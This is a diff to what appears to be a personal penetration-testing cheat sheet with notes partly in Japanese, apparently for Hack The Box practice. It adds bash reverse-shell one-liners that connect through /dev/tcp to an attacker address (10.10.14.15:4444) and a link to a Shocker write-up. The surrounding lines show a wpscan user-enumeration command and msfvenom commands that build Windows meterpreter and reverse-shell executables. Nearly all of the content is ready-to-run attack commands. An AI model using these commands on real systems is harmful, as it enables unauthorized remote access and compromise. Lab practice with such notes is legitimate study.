@@ -204,6 +204,16 @@ wpscan -url <target url> -e u -t -vp --log <output filename>
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 ```
+
+#### shell
+```
+bash -i >& /dev/tcp/[url]/[port] 0>&1
+bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
+
+better shell をとるのに使った　[リンク](https://codemonkeyism.co.uk/htb-shocker/)
+```
+
+
 #### Windows(netcatなど)
 ```
 msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
